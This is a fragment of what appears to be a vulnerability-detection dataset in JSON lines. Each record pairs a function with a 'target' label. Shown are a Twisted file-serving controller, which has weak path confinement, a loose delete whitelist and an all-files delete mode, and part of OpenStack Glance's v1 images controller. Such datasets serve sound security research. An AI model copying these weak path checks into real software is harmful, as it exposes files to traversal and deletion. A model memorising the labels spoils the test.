'.join(CORS_ALLOWED_CLIENT_HEADERS)\n}\n\n#: paths where file delete operations shall be allowed\nDELETE_WHITELIST = [\n\t'/media',\n]\n\n\nclass FileController(twisted.web.resource.Resource):\n\tisLeaf = True\n\t_override_args = (\n\t\t'resource_prefix', 'root', 'do_delete', 'delete_whitelist')\n\t_resource_prefix = '/file'\n\t_root = os.path.abspath(os.path.dirname(__file__))\n\t_do_delete = False\n\t_delete_whitelist = DELETE_WHITELIST\n\tnever_gzip_extensions = ('.ts',)\n\n\tdef __init__(self, *args, **kwargs):\n\t\t\"\"\"\n\t\tDefault Constructor.\n\n\t\tArgs:\n\t\t\tresource_prefix: Prefix value for this controller instance.\n\t\t\t\tDefault is :py:data:`FileController._resource_prefix`\n\t\t\troot: Root path of files to be served.\n\t\t\t\tDefault is the path where the current file is located\n\t\t\tdo_delete: Try to actually delete files?\n\t\t\t\tDefault is False.\n\t\t\tdelete_whitelist: Folder prefixes where delete operations are\n\t\t\t\tallowed _at all_. Default is :py:data:`DELETE_WHITELIST`\n\t\t\"\"\"\n\t\tif args:\n\t\t\tfor key, value in zip(self._override_args, args):\n\t\t\t\tkwargs[key] = value\n\n\t\tfor arg_name in self._override_args:\n\t\t\tif kwargs.get(arg_name) is not None:\n\t\t\t\tattr_name = '_{:s}'.format(arg_name)\n\t\t\t\tsetattr(self, attr_name, kwargs.get(arg_name))\n\t\tself.session = kwargs.get(\"session\")\n\n\tdef _json_response(self, request, data):\n\t\t\"\"\"\n\t\tCreate a JSON representation for *data* and set HTTP headers indicating\n\t\tthat JSON encoded data is returned.\n\n\t\tArgs:\n\t\t\trequest (twisted.web.server.Request): HTTP request object\n\t\t\tdata: response content\n\t\tReturns:\n\t\t\tJSON representation of *data* with appropriate HTTP headers\n\t\t\"\"\"\n\t\trequest.setHeader(\"content-type\", \"application/json; charset=utf-8\")\n\t\treturn json.dumps(data, indent=2)\n\n\tdef get_response_data_template(self, request):\n\t\t\"\"\"\n\t\tGenerate a response data :class:`dict` containing default values and\n\t\tsome request attribute values for debugging purposes.\n\n\t\tArgs:\n\t\t\trequest (twisted.web.server.Request): HTTP request object\n\t\tReturns:\n\t\t\t(dict) response template data\n\t\t\"\"\"\n\t\tfile_path = None\n\t\tif request.path.startswith(self._resource_prefix):\n\t\t\tfile_path = request.path[len(self._resource_prefix):]\n\n\t\tresponse_data = {\n\t\t\t\"_request\": {\n\t\t\t\t\"path\": request.path,\n\t\t\t\t\"uri\": request.uri,\n\t\t\t\t\"method\": request.method,\n\t\t\t\t\"postpath\": request.postpath,\n\t\t\t\t\"file_path\": file_path,\n\t\t\t},\n\t\t\t\"result\": False,\n\t\t}\n\n\t\treturn response_data\n\n\tdef error_response(self, request, response_code=None, **kwargs):\n\t\t\"\"\"\n\t\tCreate and return an HTTP error response with data as JSON.\n\n\t\tArgs:\n\t\t\trequest (twisted.web.server.Request): HTTP request object\n\t\t\tresponse_code: HTTP Status Code (default is 500)\n\t\t\t**kwargs: additional key/value pairs\n\t\tReturns:\n\t\t\tJSON encoded data with appropriate HTTP headers\n\t\t\"\"\"\n\t\tif response_code is None:\n\t\t\tresponse_code = http.INTERNAL_SERVER_ERROR\n\n\t\tresponse_data = self.get_response_data_template(request)\n\t\tresponse_data.update(**kwargs)\n\n\t\tresponse_data['me'] = dict()\n\t\tfor arg_name in self._override_args:\n\t\t\tattr_name = '_{:s}'.format(arg_name)\n\t\t\tresponse_data['me'][attr_name] = getattr(self, attr_name)\n\n\t\trequest.setResponseCode(response_code)\n\t\treturn self._json_response(request, response_data)\n\n\tdef _existing_path_or_bust(self, request):\n\t\t\"\"\"\n\t\tVerify that a filesystem location which is contained in *request.path*\n\t\tis valid and an existing path.\n\n\t\tArgs:\n\t\t\trequest (twisted.web.server.Request): HTTP request object\n\t\tReturns:\n\t\t\tpath\n\t\tRaises:\n\t\t\tValueError: If contained path value is invalid.\n\t\t\tIOError: If contained path value is not existing.\n\t\t\"\"\"\n\t\trq_path = urlparse.unquote(request.path)\n\t\tif not rq_path.startswith(self._resource_prefix):\n\t\t\traise ValueError(\"Invalid Request Path {!r}\".format(request.path))\n\n\t\tfile_path = os.path.join(\n\t\t\tself._root, rq_path[len(self._resource_prefix) + 1:])\n\t\tfile_path = re.sub(MANY_SLASHES_REGEX, '/', file_path)\n\n\t\tif not os.path.exists(file_path):\n\t\t\traise IOError(\"Not Found {!r}\".format(file_path))\n\n\t\treturn file_path\n\n\tdef render_OPTIONS(self, request):\n\t\t\"\"\"\n\t\tRender response for an HTTP OPTIONS request.\n\n\t\tExample request\n\n\t\t\tcurl -iv --noproxy localhost http://localhost:18888/file\n\n\t\tArgs:\n\t\t\trequest (twisted.web.server.Request): HTTP request object\n\t\tReturns:\n\t\t\tHTTP response with headers\n\t\t\"\"\"\n\t\tfor key in CORS_DEFAULT:\n\t\t\trequest.setHeader(key, CORS_DEFAULT[key])\n\n\t\treturn ''\n\n\tdef render_legacy(self, request):\n\t\t\"\"\"\n\t\tRender response for an HTTP GET request. In order to maintain\n\t\tbackward compatibility this method emulates the behaviour of the\n\t\tlegacy method implementation.\n\n\t\tArgs:\n\t\t\trequest (twisted.web.server.Request): HTTP request object\n\t\tReturns:\n\t\t\tHTTP response with headers\n\t\t\"\"\"\n\t\treturn file.FileController().render(request)\n\n\tdef _glob(self, path, pattern='*'):\n\t\tif path == '/':\n\t\t\tglob_me = '/' + pattern\n\t\telse:\n\t\t\tglob_me = '/'.join((path, pattern))\n\t\treturn glob.iglob(glob_me)\n\n\tdef _walk(self, path):\n\t\tfor root, dirs, files in os.walk(path):\n\t\t\tfor dir_item in dirs:\n\t\t\t\tyield os.path.join(root, dir_item)\n\t\t\tfor file_item in files:\n\t\t\t\tyield os.path.join(root, file_item)\n\n\tdef render_path_listing(self, request, path):\n\t\t\"\"\"\n\t\tGenerate a file/folder listing of *path*'s contents.\n\n\t\tArgs:\n\t\t\trequest (twisted.web.server.Request): HTTP request object\n\t\t\tpath: folder location\n\t\tReturns:\n\t\t\tHTTP response with headers\n\t\t\"\"\"\n\t\tresponse_data = self.get_response_data_template(request)\n\t\tresponse_data.update(\n\t\t\t{\n\t\t\t\t'result': True,\n\t\t\t\t'dirs': [],\n\t\t\t\t'files': [],\n\t\t\t}\n\t\t)\n\n\t\tgenerator = None\n\t\tif \"pattern\" in request.args:\n\t\t\tgenerator = self._glob(path, request.args[\"pattern\"][0])\n\n\t\tif \"recursive\" in request.args:\n\t\t\tgenerator = self._walk(path)\n\n\t\tif generator is None:\n\t\t\tgenerator = self._glob(path)\n\n\t\tfor item in generator:\n\t\t\tif os.path.isdir(item):\n\t\t\t\tresponse_data['dirs'].append(item)\n\t\t\telse:\n\t\t\t\tresponse_data['files'].append(item)\n\n\t\treturn self._json_response(request, response_data)\n\n\tdef render_file(self, request, path):\n\t\t\"\"\"\n\t\tReturn the contents of file *path*.\n\n\t\tArgs:\n\t\t\trequest (twisted.web.server.Request): HTTP request object\n\t\t\tpath: file path\n\t\tReturns:\n\t\t\tHTTP response with headers\n\t\t\"\"\"\n\t\t(_, ext) = os.path.splitext(path)\n\n\t\tif ext in self.never_gzip_extensions:\n\t\t\t# hack: remove gzip from the list of supported encodings\n\t\t\tacceptHeaders = request.requestHeaders.getRawHeaders(\n\t\t\t\t'accept-encoding', [])\n\t\t\tsupported = ','.join(acceptHeaders).split(',')\n\t\t\trequest.requestHeaders.setRawHeaders(\n\t\t\t\t'accept-encoding', list(set(supported) - {'gzip'}))\n\n\t\tresult = twisted.web.static.File(\n\t\t\tpath, defaultType=\"application/octet-stream\")\n\n\t\treturn result.render(request)\n\n\tdef render_GET(self, request):\n\t\t\"\"\"\n\t\tHTTP GET request handler returning\n\n\t\t\t* legacy response if the query *file* or *dir* parameter is set\n\t\t\t* file contents if *request.path* contains a file path\n\t\t\t* directory listing if *request.path* contains a folder path\n\n\t\tArgs:\n\t\t\trequest (twisted.web.server.Request): HTTP request object\n\t\tReturns:\n\t\t\tHTTP response with headers\n\t\t\"\"\"\n\t\tattic_args = {'file', 'dir'}\n\n\t\tif len(attic_args & set(request.args.keys())) >= 1:\n\t\t\treturn self.render_legacy(request)\n\n\t\trequest.setHeader(\n\t\t\t'Access-Control-Allow-Origin', CORS_DEFAULT_ALLOW_ORIGIN)\n\n\t\ttry:\n\t\t\ttarget_path = self._existing_path_or_bust(request)\n\t\texcept ValueError as vexc:\n\t\t\treturn self.error_response(\n\t\t\t\trequest, response_code=http.BAD_REQUEST, message=vexc.message)\n\t\texcept IOError as iexc:\n\t\t\treturn self.error_response(\n\t\t\t\trequest, response_code=http.NOT_FOUND, message=iexc.message)\n\n\t\tif os.path.isdir(target_path):\n\t\t\treturn self.render_path_listing(request, target_path)\n\t\telse:\n\t\t\treturn self.render_file(request, target_path)\n\n\tdef render_POST(self, request):\n\t\t\"\"\"\n\t\tHTTP POST request handler (currently NOT implemented).\n\n\t\tArgs:\n\t\t\trequest (twisted.web.server.Request): HTTP request object\n\t\tReturns:\n\t\t\tHTTP response with headers\n\t\t\"\"\"\n\t\trequest.setHeader(\n\t\t\t'Access-Control-Allow-Origin', CORS_DEFAULT_ALLOW_ORIGIN)\n\t\treturn self.error_response(request, response_code=http.NOT_IMPLEMENTED)\n\n\tdef render_PUT(self, request):\n\t\t\"\"\"\n\t\tHTTP PUT request handler (currently NOT implemented).\n\n\t\tArgs:\n\t\t\trequest (twisted.web.server.Request): HTTP request object\n\t\tReturns:\n\t\t\tHTTP response with headers\n\t\t\"\"\"\n\t\trequest.setHeader(\n\t\t\t'Access-Control-Allow-Origin', CORS_DEFAULT_ALLOW_ORIGIN)\n\t\treturn self.error_response(request, response_code=http.NOT_IMPLEMENTED)\n\n\tdef render_DELETE(self, request):\n\t\t\"\"\"\n\t\tHTTP DELETE request handler which may try to delete a file if its\n\t\tpath's prefix is in :py:data:`FileController._delete_whitelist` and\n\t\t:py:data:`FileController._do_delete` is True.\n\n\t\tArgs:\n\t\t\trequest (twisted.web.server.Request): HTTP request object\n\t\tReturns:\n\t\t\tHTTP response with headers\n\t\t\"\"\"\n\t\trequest.setHeader(\n\t\t\t'Access-Control-Allow-Origin', CORS_DEFAULT_ALLOW_ORIGIN)\n\n\t\ttry:\n\t\t\ttarget_path = self._existing_path_or_bust(request)\n\t\texcept ValueError as vexc:\n\t\t\treturn self.error_response(\n\t\t\t\trequest, response_code=http.BAD_REQUEST, message=vexc.message)\n\t\texcept IOError as iexc:\n\t\t\treturn self.error_response(\n\t\t\t\trequest, response_code=http.NOT_FOUND, message=iexc.message)\n\n\t\tif os.path.isdir(target_path):\n\t\t\treturn self.error_response(\n\t\t\t\trequest, response_code=http.NOT_IMPLEMENTED,\n\t\t\t\tmessage='Will not remove folder {!r}'.format(target_path))\n\n\t\tfor prefix in self._delete_whitelist:\n\t\t\tif not target_path.startswith(os.path.abspath(prefix)):\n\t\t\t\treturn self.error_response(request,\n\t\t\t\t\t\t\t\t\t\t   response_code=http.FORBIDDEN)\n\n\t\tresponse_data = self.get_response_data_template(request)\n\t\ttry:\n\t\t\tresponse_data['result'] = True\n\t\t\tif self._do_delete:\n\t\t\t\tos.unlink(target_path)\n\t\t\t\tmessage = 'Removed {!r}'.format(target_path)\n\t\t\telse:\n\t\t\t\tmessage = 'WOULD remove {!r}'.format(target_path)\n\t\t\tresponse_data['message'] = message\n\t\texcept Exception as eexc:\n\t\t\tresponse_data['message'] = 'Cannot remove {!r}: {!s}'.format(\n\t\t\t\ttarget_path, eexc.message)\n\t\t\trequest.setResponseCode(http.INTERNAL_SERVER_ERROR)\n\n\t\treturn self._json_response(request, response_data)\n\n\nif __name__ == '__main__':\n\tfrom twisted.web.resource import Resource, EncodingResourceWrapper\n\tfrom twisted.web.server import Site, GzipEncoderFactory\n\tfrom twisted.internet import reactor\n\n\t# standard factory example\n\tfactory_s = Site(FileController(DEFAULT_ROOT_PATH))\n\n\t# experimental factory\n\troot = Resource()\n\troot.putChild(\"/\", FileController)\n\troot.putChild(\"/file\", FileController)\n\tfactory_r = Site(root)\n\n\t#  experimental factory: enable gzip compression\n\twrapped = EncodingResourceWrapper(\n\t\tFileController(\n\t\t\troot=DEFAULT_ROOT_PATH,\n\t\t\t# DANGER, WILL ROBINSON! These values allow deletion of ALL files!\n\t\t\tdo_delete=True, delete_whitelist=[]\n\t\t),\n\t\t[GzipEncoderFactory()])\n\tfactory_s_gz = Site(wrapped)\n\n\treactor.listenTCP(18888, factory_s_gz)\n\treactor.run()\n", "target": 0}
{"idx": 1029, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2010 OpenStack LLC.\n# All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"\n/images endpoint for Glance v1 API\n\"\"\"\n\nimport sys\nimport traceback\n\nimport eventlet\nfrom webob.exc import (HTTPError,\n                       HTTPNotFound,\n                       HTTPConflict,\n                       HTTPBadRequest,\n                       HTTPForbidden,\n                       HTTPRequestEntityTooLarge,\n                       HTTPServiceUnavailable)\n\nfrom glance.api import common\nfrom glance.api import policy\nimport glance.api.v1\nfrom glance import context\nfrom glance.api.v1 import controller\nfrom glance.api.v1 import filters\nfrom glance.common import exception\nfrom glance.common import utils\nfrom glance.common import wsgi\nfrom glance import notifier\nfrom glance.openstack.common import cfg\nimport glance.openstack.common.log as logging\nfrom glance import registry\nfrom glance.store import (create_stores,\n                          get_from_backend,\n                          get_size_from_backend,\n                          safe_delete_from_backend,\n                          schedule_delayed_delete_from_backend,\n                          get_store_from_location,\n                          get_store_from_scheme)\n\n\nLOG = logging.getLogger(__name__)\nSUPPORTED_PARAMS = glance.api.v1.SUPPORTED_PARAMS\nSUPPORTED_FILTERS = glance.api.v1.SUPPORTED_FILTERS\nCONTAINER_FORMATS = ['ami', 'ari', 'aki', 'bare', 'ovf']\nDISK_FORMATS = ['ami', 'ari', 'aki', 'vhd', 'vmdk', 'raw', 'qcow2', 'vdi',\n                'iso']\n\n\n# Defined at module level due to _is_opt_registered\n# identity check (not equality).\ndefault_store_opt = cfg.StrOpt('default_store', default='file')\n\nCONF = cfg.CONF\nCONF.register_opt(default_store_opt)\n\n\ndef validate_image_meta(req, values):\n\n    name = values.get('name')\n    disk_format = values.get('disk_format')\n    container_format = values.get('container_format')\n\n    if 'disk_format' in values:\n        if not disk_format in DISK_FORMATS:\n            msg = \"Invalid disk format '%s' for image.\" % disk_format\n            raise HTTPBadRequest(explanation=msg, request=req)\n\n    if 'container_format' in values:\n        if not container_format in CONTAINER_FORMATS:\n            msg = \"Invalid container format '%s' for image.\" % container_format\n            raise HTTPBadRequest(explanation=msg, request=req)\n\n    if name and len(name) > 255:\n        msg = _('Image name too long: %d') % len(name)\n        raise HTTPBadRequest(explanation=msg, request=req)\n\n    amazon_formats = ('aki', 'ari', 'ami')\n\n    if disk_format in amazon_formats or container_format in amazon_formats:\n        if disk_format is None:\n            values['disk_format'] = container_format\n        elif container_format is None:\n            values['container_format'] = disk_format\n        elif container_format != disk_format:\n            msg = (\"Invalid mix of disk and container formats. \"\n                   \"When setting a disk or container format to \"\n                   \"one of 'aki', 'ari', or 'ami', the container \"\n                   \"and disk formats must match.\")\n            raise HTTPBadRequest(explanation=msg, request=req)\n\n    return values\n\n\nclass Controller(controller.BaseController):\n    \"\"\"\n    WSGI controller for images resource in Glance v1 API\n\n    The images resource API is a RESTful web service for image data. The API\n    is as follows::\n\n        GET /images -- Returns a set of brief metadata about images\n        GET /images/detail -- Returns a set of detailed metadata about\n                              images\n        HEAD /images/<ID> -- Return metadata about an image with id <ID>\n        GET /images/<ID> -- Return image data for image with id <ID>\n        POST /images -- Store image data and return metadata about the\n                        newly-stored image\n        PUT /images/<ID> -- Update image metadata and/or upload image\n                            data for a previously-reserved image\n        DELETE /images/<ID> -- Delete the image with id <ID>\n    \"\"\"\n\n    def __init__(self):\n        create_stores()\n        self.verify_scheme_or_exit(CONF.default_store)\n        self.notifier = notifier.Notifier()\n        registry.configure_registry_client()\n        self.policy = policy.Enforcer()\n        self.pool = eventlet.GreenPool(size=1024)\n\n    def _enforce(self, req, action):\n        \"\"\"Authorize an action against our policies\"\"\"\n        try:\n            self.policy.enforce(req.context, action, {})\n        except exception.Forbidden:\n            raise HTTPForbidden()\n\n    def index(self, req):\n        \"\"\"\n        Returns the following information for all public, available images:\n\n            * id -- The opaque image identifier\n            * name -- The name of the image\n            * disk_format -- The disk image format\n            * container_format -- The \"container\" format of the image\n            * checksum -- MD5 checksum of the image data\n            * size -- Size of image data in bytes\n\n        :param req: The WSGI/Webob Request object\n        :retval The response body is a mapping of the following form::\n\n            {'images': [\n                {'id': <ID>,\n                 'name': <NAME>,\n                 'disk_format': <DISK_FORMAT>,\n                 'container_format': <DISK_FORMAT>,\n                 'checksum': <CHECKSUM>\n                 'size': <SIZE>}, ...\n            ]}\n        \"\"\"\n        self._enforce(req, 'get_images')\n        params = self._get_query_params(req)\n        try:\n            images = registry.get_images_list(req.context, **params)\n        except exception.Invalid, e:\n            raise HTTPBadRequest(explanation=\"%s\" % e)\n\n        return dict(images=images)\n\n    def detail(self, req):\n        \"\"\"\n        Returns detailed information for all public, available images\n\n        :param req: The WSGI/Webob Request object\n        :retval The response body is a mapping of the following form::\n\n            {'images': [\n                {'id': <ID>,\n                 'name': <NAME>,\n                 'size': <SIZE>,\n                 'disk_format': <DISK_FORMAT>,\n                 'container_format': <CONTAINER_FORMAT>,\n                 'checksum': <CHECKSUM>,\n                 'min_disk': <MIN_DISK>,\n                 'min_ram': <MIN_RAM>,\n                 'store': <STORE>,\n                 'status': <STATUS>,\n                 'created_at': <TIMESTAMP>,\n                 'updated_at': <TIMESTAMP>,\n                 'deleted_at': <TIMESTAMP>|<NONE>,\n                 'properties': {'distro': 'Ubuntu 10.04 LTS', ...}}, ...\n            ]}\n        \"\"\"\n        self._enforce(req, 'get_images')\n        params = self._get_query_params(req)\n        try:\n            images = registry.get_images_detail(req.context, **params)\n            # Strip out the Location attribute. Temporary fix for\n            # LP Bug #755916. This information is still coming back\n            # from the registry, since the API server still needs access\n            # to it, however we do not return this potential security\n            # information to the API end user...\n            for image in images:\n                del image['location']\n        except exception.Invalid, e:\n            raise HTTPBadRequest(explanation=\"%s\" % e)\n        return dict(images=images)\n\n    def _get_query_params(self, req):\n        \"\"\"\n        Extracts necessary query params from request.\n\n        :param req: the WSGI Request object\n        :retval dict of parameters that can be used by registry client\n        \"\"\"\n        params = {'filters': self._get_filters(req)}\n\n        for PARAM in SUPPORTED_PARAMS:\n            if PARAM in req.params:\n                params[PARAM] = req.params.get(PARAM)\n        return params\n\n    def _get_filters(self, req):\n        \"\"\"\n        Return a dictionary of query param filters from the request\n\n        :param req: the Request object coming from the wsgi layer\n        :retval a dict of key/value filters\n        \"\"\"\n        query_filters = {}\n        for param in req.params:\n            if param in SUPPORTED_FILTERS or param.startswith('property-'):\n                query_filters[param] = req.params.get(param)\n                if not filters.validate(param, query_filters[param]):\n                    raise HTTPBadRequest('Bad value passed to filter %s '\n                                         'got %s' % (param,\n                                                     query_filters[param]))\n        return query_filters\n\n    def meta(self, req, id):\n        \"\"\"\n        Returns metadata about an image in the HTTP headers of the\n        response object\n\n        :param req: The WSGI/Webob Request object\n        :param id: The opaque image identifier\n        :retval similar to 'show' method but without image_data\n\n        :raises HTTPNotFound if image metadata is not available to user\n        \"\"\"\n        self._enforce(req, 'get_image')\n        image_meta = self.get_image_meta_or_404(req, id)\n        del image_meta['location']\n        return {\n            'image_meta': image_meta\n        }\n\n    @staticmethod\n    def _validate_source(source, req):\n        \"\"\"\n        External sources (as specified via the location or copy-from headers)\n        are supported only over non-local store types, i.e. S3, Swift, HTTP.\n        Note the absence of file:// for security reasons, see LP bug #942118.\n        If the above constraint is violated, we reject with 400 \"Bad Request\".\n        \"\"\"\n        if source:\n            for scheme in ['s3', 'swift', 'http']:\n                if source.lower().startswith(scheme):\n                    return source\n            msg = _(\"External sourcing not supported for store %s\") % source\n            LOG.error(msg)\n            raise HTTPBadRequest(explanation=msg,\n                                 request=req,\n                                 content_type=\"text/plain\")\n\n    @staticmethod\n    def _copy_from(req):\n        return req.headers.get('x-glance-api-copy-from')\n\n    @staticmethod\n    def _external_source(image_meta, req):\n        source = image_meta.get('location', Controller._copy_from(req))\n        return Controller._validate_source(source, req)\n\n    @staticmethod\n    def _get_from_store(context, where):\n        try:\n            image_data, image_size = get_from_backend(context, where)\n        except exception.NotFound, e:\n            raise HTTPNotFound(explanation=\"%s\" % e)\n        image_size = int(image_size) if image_size else None\n        return image_data, image_size\n\n    def show(self, req, id):\n        \"\"\"\n        Returns an iterator that can be used to retrieve an image's\n        data along with the image metadata.\n\n        :param req: The WSGI/Webob Request object\n        :param id: The opaque image identifier\n\n        :raises HTTPNotFound if image is not available to user\n        \"\"\"\n        self._enforce(req, 'get_image')\n        self._enforce(req, 'download_image')\n        image_meta = self.get_active_image_meta_or_404(req, id)\n\n        if image_meta.get('size') == 0:\n            image_iterator = iter([])\n        else:\n            image_iterator, size = self._get_from_store(req.context,\n                                                        image_meta['location'])\n            image_iterator = utils.cooperative_iter(image_iterator)\n            image_meta['size'] = size or image_meta['size']\n\n        del image_meta['location']\n        return {\n            'image_iterator': image_iterator,\n            'image_meta': image_meta,\n        }\n\n    def _reserve(self, req, image_meta):\n        \"\"\"\n        Adds the image metadata to the registry and assigns\n        an image identifier if one is not supplied in the request\n        headers. Sets the image's status to `queued`.\n\n        :param req: The WSGI/Webob Request object\n        :param id: The opaque image identifier\n        :param image_meta: The image metadata\n\n        :raises HTTPConflict if image already exists\n        :raises HTTPBadRequest if image metadata is not valid\n        \"\"\"\n        location = self._external_source(image_meta, req)\n\n        image_meta['status'] = ('active' if image_meta.get('size') == 0\n                                else 'queued')\n\n        if location:\n            store = get_store_from_location(location)\n            # check the store exists before we hit the registry, but we\n            # don't actually care what it is at this point\n            self.get_store_or_400(req, store)\n\n            # retrieve the image size from remote store (if not provided)\n            image_meta['size'] = self._get_size(req.context, image_meta,\n                                                location)\n        else:\n            # Ensure that the size attribute is set to zero for directly\n            # uploadable images (if not provided). The size will be set\n            # to a non-zero value during upload\n            image_meta['size'] = image_meta.get('size', 0)\n\n        try:\n            image_meta = registry.add_image_metadata(req.context, image_meta)\n            return image_meta\n        except exception.Duplicate:\n            msg = (_(\"An image with identifier %s already exists\") %\n                   image_meta['id'])\n            LOG.error(msg)\n            raise HTTPConflict(explanation=msg,\n                               request=req,\n                               content_type=\"text/plain\")\n        except exception.Invalid, e:\n            msg = (_(\"Failed to reserve image. Got error: %(e)s\") % locals())\n            for line in msg.split('\\n'):\n                LOG.error(line)\n            raise HTTPBadRequest(explanation=msg,\n                                 request=req,\n                                 content_type=\"text/plain\")\n        except exception.Forbidden:\n            msg = _(\"Forbidden to reserve image.\")\n            LOG.error(msg)\n            raise HTTPForbidden(explanation=msg,\n                                request=req,\n                                content_type=\"text/plain\")\n\n    def _upload(self, req, image_meta):\n        \"\"\"\n        Uploads the payload of the request to a backend store in\n        Glance. If the `x-image-meta-store` header is set, Glance\n        will attempt to use that scheme; if not, Glance will use the\n        scheme set by the flag `default_store` to find the backing store.\n\n        :param req: The WSGI/Webob Request object\n        :param image_meta: Mapping of metadata about image\n\n        :raises HTTPConflict if image already exists\n        :retval The location where the image was stored\n        \"\"\"\n\n        copy_from = self._copy_from(req)\n        if copy_from:\n            try:\n                image_data, image_size = self._get_from_store(req.context,\n                                                              copy_from)\n            except Exception as e:\n                self._safe_kill(req, image_meta['id'])\n                msg = _(\"Copy from external source failed: %s\") % e\n                LOG.error(msg)\n                return\n            image_meta['size'] = image_size or image_meta['size']\n        else:\n            try:\n                req.get_content_type('application/octet-stream')\n            except exception.InvalidContentType:\n                self._safe_kill(req, image_meta['id'])\n                msg = _(\"Content-Type must be application/octet-stream\")\n                LOG.error(msg)\n                raise HTTPBadRequest(explanation=msg)\n\n            image_data = req.body_file\n\n        scheme = req.headers.get('x-image-meta-store', CONF.default_store)\n\n        store = self.get_store_or_400(req, scheme)\n\n        image_id = image_meta['id']\n        LOG.debug(_(\"Setting image %s to status 'saving'\"), image_id)\n        registry.update_image_metadata(req.context, image_id,\n                                       {'status': 'saving'})\n\n        LOG.debug(_(\"Uploading image data for image %(image_id)s \"\n                    \"to %(scheme)s store\"), locals())\n\n        try:\n            location, size, checksum = store.add(\n                image_meta['id'],\n                utils.CooperativeReader(image_data),\n                image_meta['size'])\n\n            # Verify any supplied checksum value matches checksum\n            # returned from store when adding image\n            supplied_checksum = image_meta.get('checksum')\n            if supplied_checksum and supplied_checksum != checksum:\n                msg = _(\"Supplied checksum (%(supplied_checksum)s) and \"\n                        \"checksum generated from uploaded image \"\n                        \"(%(checksum)s) did not match. Setting image \"\n                        \"status to 'killed'.\") % locals()\n                LOG.error(msg)\n                self._safe_kill(req, image_id)\n                raise HTTPBadRequest(explanation=msg,\n                                     content_type=\"text/plain\",\n                                     request=req)\n\n            # Update the database with the checksum returned\n            # from the backend store\n            LOG.debug(_(\"Updating image %(image_id)s data. \"\n                      \"Checksum set to %(checksum)s, size set \"\n                      \"to %(size)d\"), locals())\n            update_data = {'checksum': checksum,\n                           'size': size}\n            image_meta = registry.update_image_metadata(req.context,\n                                                        image_id,\n                                                        update_data)\n            self.notifier.info('image.upload', image_meta)\n\n            return location\n\n        except exception.Duplicate, e:\n            msg = _(\"Attempt to upload duplicate image: %s\") % e\n            LOG.error(msg)\n            self._safe_kill(req, image_id)\n            raise HTTPConflict(explanation=msg, request=req)\n\n        except exception.Forbidden, e:\n            msg = _(\"Forbidden upload attempt: %s\") % e\n            LOG.error(msg)\n            self._safe_kill(req, image_id)\n            raise HTTPForbidden(explanation=msg,\n                                request=req,\n                                content_type=\"text/plain\")\n\n        except exception.StorageFull, e:\n            msg = _(\"Image storage media is full: %s\") % e\n            LOG.error(msg)\n            self._safe_kill(req, image_id)\n            self.notifier.error('image.upload', msg)\n            raise HTTPRequestEntityTooLarge(explanation=msg, request=req,\n                                            content_type='text/plain')\n\n        except exception.StorageWriteDenied, e:\n            msg = _(\"Insufficient permissions on image storage media: %s\") % e\n            LOG.error(msg)\n            self._safe_kill(req, image_id)\n            self.notifier.error('image.upload', msg)\n            raise HTTPServiceUnavailable(explanation=msg, request=req,\n                                         content_type='text/plain')\n\n        except exception.ImageSizeLimitExceeded, e:\n            msg = _(\"Denying attempt to upload image larger than %d bytes.\")\n            self._safe_kill(req, image_id)\n            raise HTTPBadRequest(explanation=msg % CONF.image_size_cap,\n                                 request=req, content_type='text/plain')\n\n        except HTTPError, e:\n            self._safe_kill(req, image_id)\n            #NOTE(bcwaldon): Ideally, we would just call 'raise' here,\n            # but something in the above function calls is affecting the\n            # exception context and we must explicitly re-raise the\n            # caught exception.\n            raise e\n\n        except Exception, e:\n            tb_info = traceback.format_exc()\n            LOG.error(tb_info)\n\n            self._safe_kill(req, image_id)\n\n            msg = _(\"Error uploading image: (%(class_name)s): \"\n                    \"%(exc)s\") % ({'class_name': e.__class__.__name__,\n                                   'exc': str(e)})\n\n            raise HTTPBadRequest(explanation=msg, request=req)\n\n    def _activate(self, req, image_id, location):\n        \"\"\"\n        Sets the image status to `active` and the image's location\n        attribute.\n\n        :param req: The WSGI/Webob Request object\n        :param image_id: Opaque image identifier\n        :param location: Location of where Glance stored this image\n        \"\"\"\n        image_meta = {}\n        image_meta['location'] = location\n        image_meta['status'] = 'active'\n\n        try:\n            image_meta_data = registry.update_image_metadata(req.context,\n                                                             image_id,\n                                                             image_meta)\n            self.notifier.info(\"image.update\", image_meta_data)\n            return image_meta_data\n        except exception.Invalid, e:\n            msg = (_(\"Failed to activate image. Got error: %(e)s\")\n                   % locals())\n            for line in msg.split('\\n'):\n                LOG.error(line)\n            raise HTTPBadRequest(explanation=msg,\n                                 request=req,\n                                 content_type=\"text/plain\")\n\n    def _kill(self, req, image_id):\n        \"\"\"\n        Marks the image status to `killed`.\n\n        :param req: The WSGI/Webob Request object\n        :param image_id: Opaque image identifier\n        \"\"\"\n        registry.update_image_metadata(req.context, image_id,\n                                       {'status': 'killed'})\n\n    def _safe_kill(self, req, image_id):\n        \"\"\"\n        Mark image killed without raising exceptions if it fails.\n\n        Since _kill is meant to be called from exceptions handlers, it should\n        not raise itself, rather it should just log its error.\n\n        :param req: The WSGI/Webob Request object\n        :param image_id: Opaque image identifier\n        \"\"\"\n        try:\n            self._kill(req, image_id)\n        except Exception, e:\n            LOG.error(_(\"Unable to kill image %(id)s: \"\n                        \"%(exc)s\") % ({'id': image_id,\n                                       'exc': repr(e)}))\n\n    def _upload_and_activate(self, req, image_meta):\n        \"\"\"\n        Safely uploads the image data in the request payload\n        and activates the image in the registry after a successful\n        upload.\n\n        :param req: The WSGI/Webob Request object\n        :param image_meta: Mapping of metadata about image\n\n        :retval Mapping of updated image data\n        \"\"\"\n        image_id = image_meta['id']\n        # This is necessary because of a bug in Webob 1.0.2 - 1.0.7\n        # See: https://bitbucket.org/ianb/webob/\n        # issue/12/fix-for-issue-6-broke-chunked-transfer\n        req.is_body_readable = True\n        location = self._upload(req, image_meta)\n        return self._activate(req, image_id, location) if location else None\n\n    def _get_size(self, context, image_meta, location):\n        # retrieve the image size from remote store (if not provided)\n        return image_meta.get('size', 0) or get_size_from_backend(context,\n                                                                  location)\n\n    def _handle_source(self, req, image_id, image_meta, 